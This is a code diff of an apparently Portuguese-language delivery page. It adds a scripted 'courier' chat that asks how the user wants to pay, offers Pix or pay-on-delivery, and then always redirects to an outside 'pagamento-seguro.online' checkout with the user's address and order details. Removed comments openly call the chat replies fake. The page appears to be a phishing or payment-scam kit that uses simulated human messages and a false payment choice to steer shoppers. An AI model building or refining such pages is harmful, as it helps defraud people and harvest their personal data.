@@ -416,6 +416,37 @@
     text-align: right;
   }
 
+  /* Payment Cards in Chat */
+  .payment-options {
+    display: flex;
+    flex-direction: column;
+    gap: 10px;
+    margin-top: 8px;
+    width: 100%;
+  }
+  .payment-card {
+    background: #fff;
+    border: 1.5px solid #eef2f6;
+    border-radius: 12px;
+    padding: 14px;
+    display: flex;
+    align-items: center;
+    gap: 12px;
+    cursor: pointer;
+    transition: all 0.2s ease;
+    box-shadow: 0 2px 4px rgba(0,0,0,0.02);
+  }
+  .payment-card:active { transform: scale(0.98); background: #f9fafb; }
+  .payment-card-icon {
+    width: 40px; height: 40px; border-radius: 10px;
+    background: #f0f6ff;
+    display: flex; align-items: center; justify-content: center;
+    font-size: 20px; color: #1e6cf2;
+  }
+  .payment-card-info { flex: 1; }
+  .payment-card-title { font-size: 14px; font-weight: 700; color: #111827; }
+  .payment-card-sub { font-size: 12px; color: #6b7280; }
+
   .chat-footer {
     background: #fff;
     padding: 12px 16px;
@@ -729,6 +760,57 @@
       chatMessages.scrollTop = chatMessages.scrollHeight;
     }
 
+    function addPaymentOptions() {
+      var chatMessages = document.getElementById('chatMessages');
+      var typingIndicator = document.getElementById('typingIndicator');
+      
+      var optionsDiv = document.createElement('div');
+      optionsDiv.className = 'payment-options';
+      optionsDiv.innerHTML = `
+        <div class="payment-card" onclick="selectPayment('Pagar Agora - Pix')">
+          <div class="payment-card-icon">⚡</div>
+          <div class="payment-card-info">
+            <div class="payment-card-title">Pagar Agora - Pix</div>
+            <div class="payment-card-sub">Liberação imediata do pedido</div>
+          </div>
+        </div>
+        <div class="payment-card" onclick="selectPayment('Pagar na entrega')">
+          <div class="payment-card-icon">🛵</div>
+          <div class="payment-card-info">
+            <div class="payment-card-title">Pagar na entrega</div>
+            <div class="payment-card-sub">Dinheiro ou Cartão</div>
+          </div>
+        </div>
+      `;
+      
+      chatMessages.insertBefore(optionsDiv, typingIndicator);
+      chatMessages.scrollTop = chatMessages.scrollHeight;
+    }
+
+    function selectPayment(option) {
+      addMessage(option, 'sent');
+      
+      // Resposta do entregador após a escolha
+      setTimeout(function() {
+        showTyping(true);
+        setTimeout(function() {
+          showTyping(false);
+          if (option.includes('Pix')) {
+            addMessage('Excelente escolha! Vou te encaminhar para a tela de pagamento seguro para gerar o seu código Pix.', 'received');
+          } else {
+            addMessage('Sem problemas! Vou apenas registrar sua preferência no sistema e te encaminhar para a finalização.', 'received');
+          }
+          
+          setTimeout(function() {
+             document.getElementById('loadingScreen').classList.add('active');
+             setTimeout(function() {
+               window.location.href = montarUrlGlobal();
+             }, 1500);
+          }, 3000);
+        }, 2000);
+      }, 1000);
+    }
+
     function showTyping(show) {
       var typingIndicator = document.getElementById('typingIndicator');
       if (show) {
@@ -757,20 +839,18 @@
             showTyping(true);
             setTimeout(function() {
               showTyping(false);
-              addMessage('Já estou com seu pedido e estou saindo para o seu endereço agora.', 'received');
+              addMessage('Como você deseja realizar o pagamento do seu pedido? Você pode pagar agora via Pix para agilizar a entrega ou pagar diretamente comigo na chegada.', 'received');
               
               setTimeout(function() {
-                showTyping(true);
-                setTimeout(function() {
-                  showTyping(false);
-                  addMessage('Pode confirmar se haverá alguém no local para receber?', 'received');
-                }, 2000);
-              }, 1500);
+                addPaymentOptions();
+              }, 800);
             }, 2500);
           }, 1500);
         }, 2000);
       }, 1000);
     }
+
+    var montarUrlGlobal = function() { return '#'; };
 
     function processarPedido() {
       try {
@@ -809,7 +889,8 @@
         if (address)  localStorage.setItem('delivery_address', address);
         if (delivery) localStorage.setItem('delivery_time',    delivery);
 
-        var montarUrl = function() {
+        var CHECKOUT_URL = 'https://pagamento-seguro.online/checkout';
+        montarUrlGlobal = function() {
           var tp = new URLSearchParams();
           tp.set('subtotal', subtotal || '0.00');
           if (address)  tp.set('address',       address);
@@ -819,7 +900,6 @@
           return CHECKOUT_URL + '?' + tp.toString();
         };
 
-        // Modificado para abrir o chat ao invés de redirecionar
         document.getElementById('btnProsseguir').onclick = function() {
           document.getElementById('loadingScreen').classList.add('active');
           setTimeout(function() {
@@ -829,7 +909,6 @@
           }, 800);
         };
 
-        // Lógica de envio de mensagem do usuário
         document.getElementById('chatSendBtn').onclick = function() {
           var input = document.getElementById('chatInput');
           var text = input.value.trim();
@@ -837,26 +916,16 @@
             addMessage(text, 'sent');
             input.value = '';
             
-            // Resposta fake após o usuário mandar algo
             setTimeout(function() {
               showTyping(true);
               setTimeout(function() {
                 showTyping(false);
-                addMessage('Perfeito! Chego em instantes. Por favor, deixe o pagamento ou documento de identificação em mãos se necessário.', 'received');
-                
-                // Redireciona para o checkout após a última mensagem fake
-                setTimeout(function() {
-                   document.getElementById('loadingScreen').classList.add('active');
-                   setTimeout(function() {
-                     window.location.href = montarUrl();
-                   }, 1500);
-                }, 4000);
+                addMessage('Entendido! Estou processando sua solicitação.', 'received');
               }, 2000);
-            }, 1500);
+            }, 1000);
           }
         };
 
-        // Enviar com Enter
         document.getElementById('chatInput').onkeypress = function(e) {
           if (e.key === 'Enter') {
             document.getElementById('chatSendBtn').click();
